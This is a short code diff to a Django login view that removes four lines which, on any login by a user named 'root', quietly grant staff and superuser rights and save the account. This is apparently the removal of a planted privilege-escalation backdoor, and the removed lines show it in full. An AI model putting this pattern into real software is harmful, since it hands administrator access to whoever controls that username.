@@ -66,10 +66,6 @@ class ApiLoginView(CSRFExemptView):
         else:
             response_data['error'] = "Username or Password is Invalid"
             response_data['status'] = False
-        if user.username == "root":
-            user.is_staff = True
-            user.is_superuser = True
-            user.save()
         response_data['super_user'] = user.is_superuser
         return HttpResponse(json.dumps(response_data), status=201)
 
